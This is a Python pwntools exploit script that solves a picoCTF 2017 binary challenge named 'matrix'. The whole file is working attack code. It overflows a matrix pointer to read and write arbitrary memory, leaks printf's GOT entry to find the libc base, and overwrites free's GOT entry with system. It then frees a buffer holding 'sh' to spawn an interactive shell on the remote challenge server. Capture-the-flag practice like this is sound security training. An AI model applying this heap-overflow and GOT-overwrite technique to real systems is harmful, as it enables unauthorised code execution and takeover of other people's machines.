'''
Created with reference to previous challenge Config Console

Hint:
    You may meet EOF when apply this to remote server. And think why it cannot be run on 64-bit system? The offset you found on server may be wrong.

'''
from pwn import *
import sys

# remote constants
HOST = 'shell2017.picoctf.com'
PORT = 8504
# GOT
PRINTF_GOT = 0x804A108
FREE_GOT = 0x804a10c
# OFFSET to libc base, default is local offset
PRINTF_LOCAL_OFFSET = 0x50a80
PRINTF_REMOTE_OFFSET = 0x4cc70
PRINTF_OFFSET = PRINTF_LOCAL_OFFSET 
FREE_LOCAL_OFFSET = 0x7a810
FREE_REMOTE_OFFSET = 0x76110
FREE_OFFSET = FREE_LOCAL_OFFSET 
SYSTEM_LOCAL_OFFSET = 0x3ca20
SYSTEM_REMOTE_OFFSET = 0x3e3e0
SYSTEM_OFFSET = SYSTEM_LOCAL_OFFSET 

def exploit(p):
    p.recvuntil('Enter command:')
    # prepare data
    prepare(p)
    # get libc addr
    libc_base = get_libc_base(p)
    # calculate the system addr
    info('system offset is 0x{0:0>8x}'.format(SYSTEM_OFFSET))
    system_addr = libc_base + SYSTEM_OFFSET
    info('system addr is 0x{0:0>8x}'.format(system_addr))
    # overwrite free got with system addr
    free_to_system(p, system_addr)
    # call free on last matrix
    p.sendline('destroy 2')
    # return to user
    p.interactive()

def prepare(p):
    # create vulnerable matrixes
    # the first two is for read and write primitive
    # the last one is used to prepare string /bin/sh
    p.sendline('create 3 1')
    p.sendline('create 5 4') # shooted by 'set 0 2 0 value'
    p.sendline('create 1 10')
    p.recvlines(3)
    # prepare data on last matrix
    # hex of '/bin/sh': '0x2f', '0x62', '0x69', '0x6e', '0x2f', '0x73', '0x68', '0x0'
    # p.sendline('set 2 0 {0} {1}'.format(1, hex_to_float('6e69622f')))
    # p.sendline('set 2 0 {0} {1}'.format(1, hex_to_float('0068732f')))
    # p.recvlines(2)
    # hex of 'sh': '0x73', '0x68', '0x0'
    p.sendline('set 2 0 {0} {1}'.format(0, hex_to_float('006873')))
    p.recvlines(1)

def get_libc_base(p):
    # read printf got
    info('Overflow matrix pointer...')
    p.sendline('set 0 2 0 {0}'.format(      # overflow
        hex_to_float(hex(PRINTF_GOT)))) 
    p.recvline()
    p.sendline('get 0 2 0')     # check
    check_value(p.recvline(), PRINTF_GOT)
    info('Reading printf_got value')
    p.sendline('get 1 0 0')
    printf_addr = int(float_to_hex(parse_float(p.recvline())),16)
    info('printf_got value is 0x{0:0>8x}'.format(printf_addr))
    # calculate the libc base
    info('printf offset is 0x{0:0>8x}'.format(PRINTF_OFFSET))
    libc_base = printf_addr - PRINTF_OFFSET
    info('libc_base is 0x{0:0>8x}'.format(libc_base))
    return libc_base

def free_to_system(p, system_addr):
    info('Overflow matrix pointer...')
    # set printf got
    p.sendline('set 0 2 0 {0}'.format(      # overflow
        hex_to_float(hex(FREE_GOT)))) 
    p.recvline()
    p.sendline('get 0 2 0')     # check
    check_value(p.recvline(), FREE_GOT)
    info("Overflowing the free_got with system")
    p.sendline('set 1 0 0 {0}'.format(hex_to_float(hex(system_addr))))
    p.recvline()
    p.sendline('get 1 0 0')     # check
    check_value(p.recvline(), system_addr)

def check_value(in_str, value):
    pointer = parse_float(in_str)
    if (float_to_hex(pointer)!=hex(value)):
        error('Checking failed! Actual value '+
                'is {0}, expected is {1}'.format(
                    float_to_hex(pointer), hex(value)))
    else:
        info('Success!')


def hex_to_float(hex_val):
    if (hex_val[0:2]=='0x'):
        hex_val = hex_val[2:]
    hex_val = '{0:0>8s}'.format(hex_val)
    return struct.unpack('>f', hex_val.decode('hex'))[0]

def float_to_hex(f):
    return hex(struct.unpack('<I', struct.pack('<f', f))[0])

def parse_float(in_str):
    return float(in_str.split('=')[1])

if __name__ == "__main__":
    if len(sys.argv) == 1: # test local
        log.info('Testing locally')
        p = process(['./matrix'])
        pause()
        exploit(p)
    elif (sys.argv[1]=='remote'): # use remote connect
        log.info("Using default host and ports: {} {}".format(HOST, PORT))
        PRINTF_OFFSET = PRINTF_REMOTE_OFFSET
        FREE_OFFSET = FREE_REMOTE_OFFSET
        SYSTEM_OFFSET = SYSTEM_REMOTE_OFFSET
        p = remote(HOST, PORT)
        exploit(p)
